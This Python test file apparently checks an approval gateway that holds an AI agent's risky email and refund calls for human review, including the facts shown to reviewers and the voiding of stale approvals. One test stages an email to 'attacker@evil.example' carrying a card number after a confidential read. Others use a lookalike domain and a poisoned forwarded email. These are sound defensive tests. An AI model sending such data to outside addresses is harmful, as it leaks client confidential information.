"""M9 — the approval screen must show the facts a reviewer needs (recipient
and their client, owner of each attachment, ledger values, before/after
redaction), and at execution a NEW hold rule (not just a new block) voids the
approval."""
import json
import re
import uuid

import pytest

pytestmark = pytest.mark.usefixtures("reviewed14_sandbox_tools")
from fastapi.testclient import TestClient

from aegis import app as app_module
from aegis import approvals, db, gateway, world
from conftest import make_session


@pytest.fixture(scope="module")
def client():
    app_module.startup()
    with TestClient(app_module.app) as c:
        yield c


def _login(client, u, p):
    r = client.post("/login", data={"username": u, "password": p}, follow_redirects=False)
    return r.cookies.get("aegis_session")


def _ops():
    return dict(db.conn().execute("SELECT * FROM users WHERE username='ops'").fetchone())


def test_m9_facts_for_send_with_attachment():
    rid, s = make_session()
    gateway.handle_call(s["token"], "read_file", {"doc_id": "doc_client_list"}, None)
    out = gateway.handle_call(s["token"], "send_email",
                              {"to": "rosa@acme.example", "subject": "x", "body": "y",
                               "attachment_ids": ["doc_acme_q3"]}, uuid.uuid4().hex)
    assert out["verdict"] == "hold"  # mixed data: firm confidential read earlier
    action = db.conn().execute("SELECT * FROM actions WHERE id=?", (out["action_id"],)).fetchone()
    sess = db.conn().execute("SELECT * FROM agent_sessions WHERE id=?", (s["session_id"],)).fetchone()
    facts = gateway.approval_facts(action, sess, gateway.get_world(rid))
    assert facts["recipient"] == "rosa@acme.example"
    assert facts["recipient_client"] == "acme"
    att = facts["attachments"][0]
    assert att["id"] == "doc_acme_q3" and att["owner"] == "acme"
    assert att["sensitivity"] == "confidential"


def test_m9_facts_for_refund_show_ledger():
    rid, s = make_session(task="Process the large refund Cirrus Health asked for by email (INV-3008).")
    out = gateway.handle_call(s["token"], "issue_refund",
                              {"invoice_id": "INV-3008", "source_email": "em_cirrus_refund_large"},
                              uuid.uuid4().hex)
    assert out["verdict"] == "hold"
    action = db.conn().execute("SELECT * FROM actions WHERE id=?", (out["action_id"],)).fetchone()
    sess = db.conn().execute("SELECT * FROM agent_sessions WHERE id=?", (s["session_id"],)).fetchone()
    facts = gateway.approval_facts(action, sess, gateway.get_world(rid))
    assert facts["ledger"]["amount"] == 4200.0
    assert facts["ledger"]["client"] == "cirrus"
    assert facts["refunded_so_far"] == 0.0


def test_m9_approval_page_shows_facts(client):
    rid, s = make_session(task="Process the large refund Cirrus Health asked for by email (INV-3008).")
    out = gateway.handle_call(s["token"], "issue_refund",
                              {"invoice_id": "INV-3008", "source_email": "em_cirrus_refund_large"},
                              uuid.uuid4().hex)
    ops = _login(client, "ops", "demo-ops-2026")
    r = client.get(f"/approvals/{out['approval_id']}", cookies={"aegis_session": ops})
    assert r.status_code == 200
    assert "4200" in r.text                 # ledger value shown
    assert "cirrus" in r.text.lower()       # ledger client shown


def test_m9_new_hold_rule_voids_approval():
    rid, s = make_session()
    out = gateway.handle_call(s["token"], "send_email",
                              {"to": "rosa@acrne.example", "subject": "x", "body": "y"},
                              uuid.uuid4().hex)
    assert out["verdict"] == "hold"  # R-LOOKALIKE
    # session becomes suspicious AFTER the hold (new R-SUSPECT hold rule)
    gateway.handle_call(s["token"], "read_email", {"email_id": "em_poisoned_forward"}, None)
    res = approvals.decide(out["approval_id"], _ops(), "approve",
                           reason="I reviewed the lookalike recipient and message and approve this send.")
    assert not res["ok"]
    assert "void" in res["error"].lower() or "new" in res["error"].lower()
    w = gateway.get_world(rid)
    assert not w.sent


def test_m9_redaction_preview_in_facts():
    rid, s = make_session()
    gateway.handle_call(s["token"], "read_file", {"doc_id": "doc_client_list"}, None)
    out = gateway.handle_call(s["token"], "send_email",
                              {"to": "attacker@evil.example", "subject": "x",
                               "body": "card 4111 1111 1111 1111"}, uuid.uuid4().hex)
    assert out["verdict"] == "hold"  # mixed data
    action = db.conn().execute("SELECT * FROM actions WHERE id=?", (out["action_id"],)).fetchone()
    sess = db.conn().execute("SELECT * FROM agent_sessions WHERE id=?", (s["session_id"],)).fetchone()
    facts = gateway.approval_facts(action, sess, gateway.get_world(rid))
    assert facts["redaction_preview"]
    assert "4111 1111 1111 1111" not in json.dumps(facts["redaction_preview"])